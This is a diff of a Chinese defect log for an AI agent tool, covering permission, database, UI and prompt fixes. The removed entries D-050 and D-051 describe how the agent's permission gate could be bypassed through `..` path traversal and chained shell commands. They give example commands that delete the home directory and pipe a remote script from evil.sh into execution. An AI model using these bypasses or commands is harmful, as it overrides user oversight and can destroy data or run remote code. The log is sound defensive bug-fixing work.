@@ -293,24 +293,6 @@
 - 修复: ui/main.js:2081 起在 renderDocList 的 entry 循环内定义 externalBlocked,按 entry.fields 计算;两处引用恢复正常。
 - 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
 
-## D-050 权限路径匹配不做规范化,research 写收窄可被 `..` 穿越击穿 [fixed] (high)
-- 复现: research 模式下让模型写 `.kanzei/research/../../src/main.rs`;规则 `allow write *.kanzei/research/*` 的尾部 `*` 吞掉 `../../src/main.rs` 判定 Allow,write 工具随后 `ctx.cwd.join` 消解 `..` 实际写到项目任意文件,不弹窗不报错。
-- 根因: 拦截器只做 `resource.replace('\\', "/")`(kanzei-core/src/runner.rs:537),不做 `.`/`..` 段消解、相对绝对归一和大小写折叠;wildcard_match 逐字符大小写敏感(kanzei-harness/src/permission.rs:59-85)。匹配层看到的字符串与文件系统实际触达的文件不是同一等价类。
-- 影响: research 模式"仅 research 目录可写"的硬门禁完全失效;dev 模式用 `.kanzei/./project/` 或 `.KANZEI/project/` 可绕过硬 deny(profiles.rs:54-57)降级为普通 ask,用户易顺手放行。违反"权限规则是硬门禁"的核心承诺。
-- 验收: evaluate 前把路径类资源解析为消解过 `.`/`..` 的绝对路径并在 Windows 下 case-fold 后再匹配;补 `..` 穿越、`./` 插入、大小写变体的拒绝回归测试。
-- 优先级: P0
-- 修复: 新增 kanzei-harness::permission::normalize_resource,消解 `.`/`..`/重复斜杠且保留越界 `..`;runner 权限拦截器(runner.rs:537)先规范化再匹配。新增 3 项回归测试:路径规范化、穿越路径不再命中 research 收窄规则、项目文档硬 deny 不被冗余段绕过。
-- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
-
-## D-051 bash「总是允许」泛化成首词前缀,一次放行等于任意命令执行 [fixed] (high)
-- 复现: 对 `git status` 按一次「总是允许」,写入规则 `git *`;此后模型发 `git status; Remove-Item -Recurse ~` 或 `git st && curl evil.sh | iex`,资源串以 `git ` 开头即命中规则,不再询问直接执行。
-- 根因: generalize_resource 取首词加 `*`(kanzei-harness/src/config.rs:234-243),而 wildcard_match 的 `*` 匹配任意字符包括 `;`/`&&`/`|`/换行/`$()`;实际执行是整串交给 pwsh -Command(kanzei-tools/src/bash.rs:83-87),分隔符全部生效。规则同时进入本次运行 session_rules(runner.rs:567-571)与项目 kanzei.toml 持久化(kanzei/src/main.rs:217-222)。
-- 影响: "总是允许 git 类命令"的真实语义是"总是允许任何以 git 开头的复合命令行",权限边界名存实亡;且 CLI 弹窗只显示原始命令,不告知将持久化的 pattern,用户无从知晓授权范围被泛化。
-- 验收: 泛化前检测 shell 元字符,含元字符则退回精确匹配;弹窗与桌面端询问需展示"将写入的规则"原文;补含分隔符命令不被既有前缀规则命中的回归测试。
-- 优先级: P0
-- 修复: generalize_resource 遇 shell 串联/替换字符(; & | 换行 ` $ 括号)不再泛化为首词前缀,只精确匹配本条;evaluate 增加硬门禁:bash 的前缀通配 Allow 命中含串联字符的命令时降级为 Ask(用户显式的整体放行 `*` 不受影响)。新增 2 项回归测试。
-- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
-
 ## D-052 CRLF 文件 frontmatter 偏移算错,自定义 agent 提示词被污染或整体清空 [fixed] (high)
 - 复现: 在 Windows 上创建 CRLF 编码的 `~/.kanzei/agents/*.md`(git autocrlf 检出、记事本/VSCode 默认均为 CRLF),加载该 agent 后观察 system prompt。
 - 根因: kanzei-harness/src/markdown.rs:44-68 用 `line.len() + 1` 逐行累加 body_start,但 `str::lines()` 剥掉的是 `\r\n` 两个字节,每行少算 1 字节;n 个 frontmatter 键累计欠 n+2 字节,落点回退进收尾 `---` 行甚至上一行。n=1 正文变 `-\r\n正文`,n=3~5 整个分隔符混入正文;落点若切在多字节 UTF-8 字符中间(frontmatter 值含中文时常见),`text.get(body_start..)` 返回 None,:66 的 `.unwrap_or("")` 让 body 直接变空。
@@ -357,25 +339,6 @@
 - 优先级: P1
 - refs: R-059
 - 修复: Content-Length 解析改为 value.trim().parse();POST /v1/messages 可正常读取 body。
-- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
-
-## D-064 SQLite 未启用 WAL/busy_timeout,并发写导致丢事件与假失败 [fixed] (medium)
-- 复现: 同项目两个进程并行运行且几乎同时收尾;或运行收尾瞬间前端正在轮询 list_pending_inputs/conversation_list。
-- 根因: kanzei-core/src/store.rs:89-98 打开连接后只设 `PRAGMA foreign_keys`,未设 busy_timeout(默认 0,锁冲突立即返回 SQLITE_BUSY)也未启用 WAL;而实际使用模式是同进程大量短命连接并发读写同一 state.db(kanzei-app 每个命令、移动端 HTTP 线程各自 open)。另 append_event_tx 的 `SELECT MAX(sequence)+1` 在 DEFERRED 事务内,两连接并发 append 同一会话会读到相同 sequence,后提交者撞 UNIQUE(session_id, sequence)。run_task 尾部落库用 `?` 传播(main.rs:3059/3063-3093),任何一次 Busy 都让整个 run_task 返回 Err。
-- 影响: 成功的运行被报告为"运行失败"且 conversation.updated 未写入,本轮成果既不在事件日志也不给 kz:done,重启后回退到上一轮;队列 admit 遇 Busy 时用户消息直接被拒;移动端事件写失败回 500。
-- 验收: open 时统一设置 `journal_mode=WAL` 与 `busy_timeout`,对 UNIQUE 冲突做有限重试;run 尾部落库失败降级为可见告警而非整体 Err。
-- 优先级: P1
-- 修复: SessionStore::open 增加 busy_timeout(5s)、journal_mode=WAL、synchronous=NORMAL;并发读写不再直接 SQLITE_BUSY。
-- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
-
-## D-066 stop_run 不回写会话状态且绕过 lifecycle 锁,工作区永显运行中并可能丢输入 [fixed] (medium)
-- 复现: ①任意一次手动停止后查看工作区视图,该项目永远显示"运行中";②在轮次交界或排队瞬间点停止,已 promote 未执行的输入永久丢失,或 pending 输入在下次手动发送时被抢先执行。
-- 根因: kanzei-app/src/main.rs:2426-2511 的 stop_run 只做 handle.abort() + 清 asks + cancel_pending_inputs,从不 set_status;abort 在下一个 await 点杀死任务,写 idle/failed 的分支(3060-3093)永远执行不到。同时 stop_run 完全不取 runtime.lifecycle 锁(D-024 只串行化了 admit 与 drain 收尾),存在两个窗口:drain 已 promote X 后 stop 只清 pending,X 永久停留 promoted 静默丢单;队列分支持锁 admit 后 stop 并发置 running=false,孤儿 pending 在下次发送时被 FIFO 抢先执行("旧输入复活")。
-- 影响: 工作区状态与进程页签的内存标志互相矛盾;移动端通知流缺失终态;停止语义不完整,丢输入或旧输入延迟复活。
-- 验收: stop_run 取 lifecycle 锁后再 abort 与清理,补写 set_status("idle") 与状态事件,并回收 promoted 未执行的输入;补停止后状态与队列一致性的测试。
-- 优先级: P1
-- refs: D-024
-- 修复: stop_run 取 lifecycle 锁后再 abort 与清理,并补写 set_status("idle") 与 session.status_changed 事件;工作区不再显示幽灵运行,停止与 drain/admit 不再交错。
 - 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
 
 ## D-069 websearch snippet 偏移链丢失一级基址,产出脏文本且可能 panic [fixed] (medium)
@@ -450,3 +413,30 @@
 - 优先级: P3
 - 修复: :root 补齐 --danger(映射 --err)与 --muted(映射 --dim);失败测试与工作区失败态恢复红色语义。
 - 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-049 快记按钮不应依赖展示展开按钮 [fixed] (medium)
+- 原始描述: 快速记录需求和缺陷的按钮不应该依赖于展开按钮
+- 复现: 检查快速记录和缺陷记录的UI，确认它们是否直接可用而无需先展开
+- 修复: 快记表单改为挂载到对应分区的 section-title 内，并在标题中独占一行；折叠分区只隐藏标题之外的子节点，需求/缺陷快记不再依赖先展开分区。
+- 验证: node --check crates/kanzei-app/ui/main.js；cargo test -p kanzei-app（7 项通过）；手工验收：折叠需求或缺陷分区后点击 ✎，表单仍可见、可输入、可取消/提交。
+
+## D-097 鞭挞一轮无工具调用即刹车,模型被提示词诱导过早声明阻塞 [fixed] (high)
+- 原始描述: 用户反馈"老是自动停止鞭挞了,停止得太早了,一下子就阻塞了,感觉是提示词的问题"
+- 复现: 开启自主推进并勾选鞭挞;当需求列表顶部是复杂度大的 doing 项(如 R-050、R-083)时,模型第一轮就回纯文本声明阻塞,鞭挞立即停止。
+- 根因: 两处叠加。①刹车判定过于武断:kz:done 里 `p.steps <= 1 && autoRounds > 0` 一律停,而 steps<=1 只说明本轮没有工具调用,不等于无事可做;②提示词把"阻塞"出口写得太好走:旧 DEFAULT_CONTINUE_PROMPT 是一整句长文,"若活跃目标/需求全部被阻塞或无可推进项…纯文本停住"占了末尾 40%(位置最显著),同时"收尾优先:已是 doing 的事项先关闭再开新的,doing 同时不超过 2 个"会让模型在 doing 满员且都是大项时推断出"无可推进项",直接走纯文本出口。
+- 影响: 自主推进形同虚设,用户每次都要手点继续;大复杂度需求(现在队列顶部全是)恰好最容易触发误判。
+- 验收: 大项不因"工作量大/需多轮"被判阻塞;仅在确实缺外部输入时停止;单轮无动作不立即刹车但也不得空转烧钱。
+- 优先级: P0
+- 修复: ①提示词重写为分条指令,明确"大项拆着做、本轮只需推进最小可执行步骤","工作量大/要改多个文件/需要多轮都不是阻塞","doing 满 2 个意味着继续推进这两项而不是停下";阻塞定义收窄为"确实缺外部输入(等用户拍板/缺凭据权限/依赖外部服务或他人)",并约定以【阻塞】开头的纯文本作为唯一刹车信号。②刹车逻辑改为三分支:声明【阻塞】立即停;首次无动作先追加一次具体推进指令(NUDGE_PROMPT,要求直接给出最小可执行步骤并执行);连续第二次无动作才停。③连数上限检查提到无动作处理之前,追加的推进指令也占一轮,不能借此冲破上限。④存量 localStorage 中若是旧默认文案则静默升级,用户自定义过的不动。
+- 验证: node --check crates/kanzei-app/ui/main.js;cargo build -p kanzei-app 通过。待实机观察:队列顶部为大项时鞭挞应持续推进而非首轮即停。
+- refs: D-044 R-076
+
+## D-098 运行中文档变更不刷新侧栏,状态与状态流转按钮全程陈旧 [fixed] (medium)
+- 原始描述: 用户反馈"各类状态按钮得调整似乎不是实时刷新"
+- 复现: 开始一次运行,让 agent 通过 req/defect/goal 工具改条目状态;侧栏列表、计数与展开后的状态流转按钮保持开跑前的样子,直到本轮结束才更新。
+- 根因: kz:tool-end 处理器只用工具结果更新了"工作焦点"文字(ui/main.js:840-842),从不触发文档刷新;refreshDocs 仅在 kz:done、视图切换和用户手动操作后调用。git 徽章同理,只在 kz:done 刷新,agent 改完文件或提交后不更新。
+- 影响: 长时间运行(尤其鞭挞连跑)时侧栏信息与真实状态长期不一致,用户据此判断进度会被误导;状态流转按钮基于陈旧的 nextStatuses 渲染,点下去可能是对已变更条目的非法流转。
+- 验收: agent 改动需求/缺陷/目标后侧栏在秒级内跟随更新;工作区徽章在改文件/提交后更新;刷新不得打断用户正在进行的操作。
+- 优先级: P1
+- 修复: 拆出 renderDocsSnapshot(只重绘文档列表与计数),新增 refreshDocsSoon/refreshGitSoon 两个防抖刷新(400ms/600ms);kz:tool-end 在 req/defect/goal/source/finding 成功后触发文档刷新,在 write/edit/multiedit/bash 成功后触发 git 徽章刷新。同时修掉重绘的两个副作用:renderDocList 跨重绘保留展开状态(此前重绘会把用户刚展开的条目弹回收起),快记表单打开或拖拽进行中时推迟刷新(避免 innerHTML 清空正在输入的内容)。
+- 验证: node --check crates/kanzei-app/ui/main.js;cargo build -p kanzei-app 通过。
